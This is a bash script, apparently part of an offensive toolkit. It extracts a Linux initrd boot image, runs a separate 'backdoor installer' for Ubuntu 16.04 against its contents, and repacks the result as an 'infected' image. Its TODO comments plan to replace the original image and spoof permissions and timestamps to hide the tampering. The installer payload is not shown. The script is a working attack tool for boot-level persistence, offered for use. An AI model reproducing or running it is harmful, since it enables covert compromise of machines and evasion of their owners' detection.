#!/bin/bash

# Ensure an image was specified
IMAGE="$1"
if [ -z "$IMAGE" ]; then
    echo "usage: $0 <initrd image>"
    exit 1
fi

# Make sure image exists and get its abs path
ABS_IMAGE=$(readlink -e "$IMAGE")
if [ -z "$ABS_IMAGE" ]; then
    echo "Failed to locate image \"$IMAGE\"."
    exit 1
fi

# Get the backdoor installer to use
# 
# TODO: add a selector so the user can choose the appropriate payload for
#       whatever platform they're dealing with
BACKDOOR_INSTALLER=$(readlink -e "./platform/ubuntu/16.04/install.sh")
if [ -z "$BACKDOOR_INSTALLER" ]; then
    echo "Failed to locate backdoor installer."
    exit 1
fi

# Create temp directory to operate on the contents of the target initrd image
# and enter it.  Line borrowed from https://unix.stackexchange.com/a/84980
TMPDIR=`mktemp -d 2>/dev/null || mktemp -d -t 'tmpdir'`
cd "$TMPDIR"

# Print some debugging info
echo "IMAGE DIR:   $ABS_IMAGE"
echo "WORKING DIR: $TMPDIR"
echo "BACKDOOR:    $BACKDOOR_INSTALLER"

# Extract the initrd image
echo -en "Extracting image..."
zcat "$ABS_IMAGE" | cpio -idmv 2>/dev/null
echo -en "Done\n"

# Install the backdoor
echo -en "Installing backdoor..."
. "$BACKDOOR_INSTALLER" "$TMPDIR"
echo -en "Done\n"

# Pack the initrd image
echo -en "Packing infected image..."
find . | cpio -o -c | gzip > "$ABS_IMAGE.backdoored"

#echo -en "Cleaning up..."
#rm -rf "$tmpdir"
#echo -en "Done\n"

# TODO: backup the old initrd image, save the backdoored image with the
#       original filename and spoof its permissions and timestamps
